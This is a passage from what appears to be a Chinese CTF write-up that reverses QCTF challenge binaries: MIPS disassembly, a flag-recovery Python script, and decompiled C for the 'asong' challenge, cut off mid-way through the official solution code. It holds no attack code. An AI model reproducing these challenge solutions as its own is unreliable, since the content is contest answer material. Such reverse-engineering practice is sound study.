$v0, 0($v0)</span><br><span class="line">.text:004008AC                 nop</span><br><span class="line">.text:004008B0                 sll     $v0, 2</span><br><span class="line">.text:004008B4                 sll     $a0, $v0, 24</span><br><span class="line">.text:004008B8                 sra     $a0, 24</span><br><span class="line">.text:004008BC                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:004008C0                 lw      $v1, 0x28+arg_0($fp)</span><br><span class="line">.text:004008C4                 nop</span><br><span class="line">.text:004008C8                 addu    $v0, $v1, $v0</span><br><span class="line">.text:004008CC                 lb      $v0, 0($v0)</span><br><span class="line">.text:004008D0                 nop</span><br><span class="line">.text:004008D4                 sra     $v0, 6</span><br><span class="line">.text:004008D8                 sll     $v1, $v0, 24</span><br><span class="line">.text:004008DC                 sra     $v1, 24</span><br><span class="line">.text:004008E0                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:004008E4                 lw      $a1, 0x28+arg_0($fp)</span><br><span class="line">.text:004008E8                 nop</span><br><span class="line">.text:004008EC                 addu    $v0, $a1, $v0</span><br><span class="line">.text:004008F0                 or      $v1, $a0, $v1</span><br><span class="line">.text:004008F4                 sll     $v1, 24</span><br><span class="line">.text:004008F8                 sra     $v1, 24</span><br><span class="line">.text:004008FC                 sb      $v1, 0($v0)</span><br><span class="line">.text:00400900</span><br><span class="line">.text:00400900 loc_400900:                              # CODE XREF: sub_4007F0+A0j</span><br><span class="line">.text:00400900                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:00400904                 nop</span><br><span class="line">.text:00400908                 addiu   $v0, 1</span><br><span class="line">.text:0040090C                 sw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:00400910</span><br><span class="line">.text:00400910 loc_400910:                              # CODE XREF: sub_4007F0+1Cj</span><br><span class="line">.text:00400910                 lw      $a0, 0x28+arg_0($fp)  # s</span><br><span class="line">.text:00400914                 jal     strlen</span><br><span class="line">.text:00400918                 nop</span><br><span class="line">.text:0040091C                 move    $v1, $v0</span><br><span class="line">.text:00400920                 lw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:00400924                 nop</span><br><span class="line">.text:00400928                 sltu    $v0, $v1</span><br><span class="line">.text:0040092C                 bnez    $v0, loc_400814</span><br><span class="line">.text:00400930                 nop</span><br><span class="line">.text:00400934                 lw      $v0, 0x28+arg_0($fp)</span><br><span class="line">.text:00400938                 nop</span><br><span class="line">.text:0040093C                 addiu   $v1, $v0, 5</span><br><span class="line">.text:00400940                 lw      $v0, off_410D04</span><br><span class="line">.text:00400948                 li      $a2, 0x1B        # n</span><br><span class="line">.text:0040094C                 move    $a1, $v0         # s2</span><br><span class="line">.text:00400950                 move    $a0, $v1         # s1</span><br><span class="line">.text:00400954                 jal     strncmp</span><br></pre></td></tr></table></figure>
<p>第二段加密根据<code>v0</code>的奇偶性分不同情况。假设原字节为<code>12345678</code>，若<code>v0</code>为奇数，加密后变为<code>34567812</code>；若<code>v0</code>为偶数，加密后变为<code>78654321</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:004007BC  # =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:004007BC</span><br><span class="line">.text:004007BC</span><br><span class="line">.text:004007BC sub_4007BC:                              # CODE XREF: _init_proc+1Cp</span><br><span class="line">.text:004007BC                                          # DATA XREF: _init_proc:loc_400648o</span><br><span class="line">.text:004007BC                 la      $v0, ___register_frame_info</span><br><span class="line">.text:004007C4                 beqz    $v0, locret_4007DC</span><br><span class="line">.text:004007C8                 lui     $a1, 0x41</span><br><span class="line">.text:004007CC                 lui     $a0, 0x40</span><br><span class="line">.text:004007D0                 la      $a1, unk_410D38</span><br><span class="line">.text:004007D4                 j       ___register_frame_info</span><br><span class="line">.text:004007D8                 la      $a0, unk_400BF0</span><br><span class="line">.text:004007DC  # ---------------------------------------------------------------------------</span><br><span class="line">.text:004007DC</span><br><span class="line">.text:004007DC locret_4007DC:                           # CODE XREF: sub_4007BC+8j</span><br><span class="line">.text:004007DC                 jr      $ra</span><br><span class="line">.text:004007E0                 nop</span><br><span class="line">.text:004007E0  # End of function sub_4007BC</span><br><span class="line">.text:004007E0</span><br><span class="line">.text:004007E0  # ---------------------------------------------------------------------------</span><br><span class="line">.text:004007E4                 .align 4</span><br><span class="line">.text:004007F0</span><br><span class="line">.text:004007F0  # =============== S U B R O U T I N E =======================================</span><br><span class="line">.text:004007F0</span><br><span class="line">.text:004007F0</span><br><span class="line">.text:004007F0 sub_4007F0:                              # CODE XREF: sub_4009A8+114p</span><br><span class="line">.text:004007F0</span><br><span class="line">.text:004007F0 var_10          = -0x10</span><br><span class="line">.text:004007F0 var_8           = -8</span><br><span class="line">.text:004007F0 var_4           = -4</span><br><span class="line">.text:004007F0 arg_0           =  0</span><br><span class="line">.text:004007F0</span><br><span class="line">.text:004007F0                 addiu   $sp, -0x28</span><br><span class="line">.text:004007F4                 sw      $ra, 0x28+var_4($sp)</span><br><span class="line">.text:004007F8                 sw      $fp, 0x28+var_8($sp)</span><br><span class="line">.text:004007FC                 move    $fp, $sp</span><br><span class="line">.text:00400800                 sw      $a0, 0x28+arg_0($fp)</span><br><span class="line">.text:00400804                 li      $v0, 5</span><br><span class="line">.text:00400808                 sw      $v0, 0x28+var_10($fp)</span><br><span class="line">.text:0040080C                 b       loc_400910</span><br><span class="line">.text:00400810                 nop</span><br><span class="line">.text:00400814  # ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p>根据以上的分析，最后的脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">''</span></span><br><span class="line">head = <span class="string">b'Q|j&#123;g'</span></span><br><span class="line">key = <span class="string">b'\x52\xFD\x16\xA4\x89\xBD\x92\x80\x13\x41\x54\xA0\x8D\x45\x18\x81\xDE\xFC\x95\xF0\x16\x79\x1A\x15\x5B\x75\x1F'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    flag += chr(head[i] ^ <span class="number">0x20</span> - i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">27</span>):</span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag += chr((((key[i] &amp; <span class="number">0x3F</span>) &lt;&lt; <span class="number">2</span>) | ((key[i] &amp; <span class="number">0xC0</span>) &gt;&gt; <span class="number">6</span>)) ^ <span class="number">0x20</span> - <span class="number">5</span> - i)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr((((key[i] &amp; <span class="number">0xFC</span>) &gt;&gt; <span class="number">2</span>) | ((key[i] &amp; <span class="number">0x03</span>) &lt;&lt; <span class="number">6</span>)) ^ <span class="number">0x20</span> - <span class="number">5</span> - i)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<h2 id="asong"><a href="#asong" class="headerlink" title="asong"></a>asong</h2><p>详情看<a href="https://ihomura.cn/2018/07/17/WriteUp-QCTF-asong/" target="_blank" rel="noopener">大佬的博客</a>。将<code>asong</code>拖进ida，在main函数中可以看到：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// ST00_8</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">malloc</span>(<span class="number">0xBC</span>uLL);</span><br><span class="line">  v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  sub_400BBF();</span><br><span class="line">  sub_400B4C((__int64)v4);</span><br><span class="line">  sub_400C02((__int64)v4);</span><br><span class="line">  sub_400AAA(<span class="string">"that_girl"</span>, (__int64)v3);</span><br><span class="line">  sub_400E54(v4, (__int64)v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逐个查看各个函数。<code>sub_400BBF</code>和<code>sub_400B4C</code>两个函数没有任何加密操作，直接往下看。<code>sub_400C02</code>判断前五个字符是否为<code>QCTF{</code>，以及最后一个字符是否为<code>}</code>，如果是，则用0将字符截断，最后取中间的字符：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">sub_400C02</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *dest; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>((<span class="keyword">const</span> <span class="keyword">void</span> *)a1, <span class="string">"QCTF&#123;"</span>, <span class="number">5u</span>LL) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, (<span class="keyword">const</span> <span class="keyword">void</span> *)(a1 + <span class="number">5</span>), <span class="number">0x4B</span>uLL);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)dest);</span><br><span class="line">  <span class="keyword">if</span> ( *((_BYTE *)dest + v1 - <span class="number">1</span>) == <span class="number">125</span> )</span><br><span class="line">    *((_BYTE *)dest + v1 - <span class="number">1</span>) = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memcpy</span>((<span class="keyword">void</span> *)a1, dest, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">free</span>(dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400AAA</code>中，打开了<code>that_girl</code>文件，然后逐字节读取，对读取的每一个字符进行映射，映射函数为<code>sub_400936</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_400AAA</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fd = open(a1, <span class="number">0</span>, a2, a1);</span><br><span class="line">  <span class="keyword">while</span> ( read(fd, &amp;buf, <span class="number">1u</span>LL) == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = sub_400936(buf);</span><br><span class="line">    ++*(_DWORD *)(<span class="number">4L</span>L * v2 + v4);   <span class="comment">// 这里少了一句 v4 = a2;</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400936</code>对a1判断并移位，最后v5数组中保存a1在a2上的映射：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400936</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">35</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">10</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">39</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">44</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">4</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">46</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">7</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">58</span>:</span><br><span class="line">    <span class="keyword">case</span> <span class="number">59</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">21</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">63</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">27</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">95</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">49</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> ( a1 &lt;= <span class="number">47</span> || a1 &gt; <span class="number">57</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( a1 &lt;= <span class="number">64</span> || a1 &gt; <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( a1 &gt; <span class="number">96</span> &amp;&amp; a1 &lt;= <span class="number">122</span> )</span><br><span class="line">            result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">87</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">55</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(a1 - <span class="number">48</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>sub_400E54</code>最重要，其中的for循环将输入的字符串和<code>that_girl</code>读入后产生的数组想加，然后进行映射：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_400E54</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">    v5[i] = *(_DWORD *)(<span class="number">4L</span>L * (<span class="keyword">signed</span> <span class="keyword">int</span>)sub_400936(a1[i]) + a2);</span><br><span class="line">  sub_400D33((<span class="keyword">unsigned</span> __int8 *)v5);</span><br><span class="line">  sub_400DB4(v5, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v4);</span><br><span class="line">  sub_400CC0((__int64)v5, <span class="string">"out"</span>, v4);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400D33</code>中，<code>dword_6020A0</code>是一个<code>int</code>型的数组，每次对<code>v2</code>进行加密后，再通过<code>dword_6020A0</code>这张表来置换相对应的数字：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_400D33</span><span class="params">(<span class="keyword">unsigned</span> __int8 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _BYTE v2[<span class="number">5</span>]; <span class="comment">// [rsp+13h] [rbp-5h]</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">4</span>] = <span class="number">0</span>;    <span class="comment">// 应该是v2[1] = 0;</span></span><br><span class="line">  *(_DWORD *)v2 = *a1;  <span class="comment">//v2[0] = a1[0];</span></span><br><span class="line">  <span class="keyword">while</span> ( dword_6020A0[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]] )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]] = a1[dword_6020A0[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]]];</span><br><span class="line">    *(_DWORD *)&amp;v2[<span class="number">1</span>] = dword_6020A0[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]];</span><br><span class="line">  &#125;</span><br><span class="line">  result = v2[<span class="number">0</span>];</span><br><span class="line">  a1[*(<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;v2[<span class="number">1</span>]] = v2[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://t1.aixinxi.net/o_1cj0u8qv81vat7gpl071b5di3a.png-j.jpg" alt="dword_6020A0"></p>
<p><code>sub_400DB4</code>进行了一次循环移位，可以理解为整个数组首尾相连后逆时针左移了3位：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__<span class="function">fastcall <span class="title">sub_400DB4</span><span class="params">(_BYTE *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// [rsp+17h] [rbp-5h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+18h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = *a1 &gt;&gt; <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">    a1[i] = <span class="number">8</span> * a1[i] | (a1[i + <span class="number">1</span>] &gt;&gt; <span class="number">5</span>);</span><br><span class="line">  result = &amp;a1[i];</span><br><span class="line">  *result = <span class="number">8</span> * *result | v3;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>sub_400CC0</code>把最终的解密结果写入<code>out</code>，其中写入的字节数为flag去掉首尾字符后的长度。题目中给出的<code>out</code>文件的字节数为38，那么可以判断flag长度为38+6=44：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">sub_400CC0</span><span class="params">(__int64 a1, <span class="keyword">const</span> <span class="keyword">char</span> *a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  fd = open(a2, <span class="number">65</span>, <span class="number">438L</span>L);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v4; ++i )</span><br><span class="line">    write(fd, (<span class="keyword">const</span> <span class="keyword">void</span> *)(i + a1), <span class="number">1u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>官方给出的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">s = [<span class="number">22</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">24</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">17</span>, <span class="number">23</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">16</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">36</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">37</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">26</span>, <span class="number">34</span>, <span class="number">35</span>]</span><br><span class="line"> </span><br><span class="line">dic = &#123;<span class="string">"a"</span>:<span class="number">104</span>,<span class="string">"b"</span>:<span class="number">30</span>,<span class="string">"c"</span>:<span class="number">15</span>,<span class="string">"d"</span>:<span class="number">29</span>,<span class="string">"e"</span>:<span class="number">169</span>,<span class="string">"f"</span>:<span class="number">19</span>,<span class="string">"g"</span>:<span class="number">38</span>,<span class="string">"h"</span>:<span class="number">67</span>,<span class="string">"i"</span>:<span class="number">60</span>,<span class="string">"j"</span>:<span class="number">0</span>,<span class="string">"k"</span>:<span class="number">20</span>,<span class="string">"l"</span>:<span class="number">39</span>,<span class="string">"m"</span>:<span class="number">28</span>,<span class="string">"n"</span>:<span class="number">118</span>,<span class="string">"o"</span>:<span class="number">165</span>,<span class="string">"p"</span>:<span class="number">26</span>,<span class="string">"q"</span>:<span class="number">0</span>,<span class="string">"r"</span>:<span class="number">61</span>,<span class="string">"s"</span>:<span class="number">51</span>,<span class="string">"t"</span>:<span class="number">133</span>,<span class="string">"u"</span>:<span class="number">45</span>,<span class="string">"v"</span>:<span 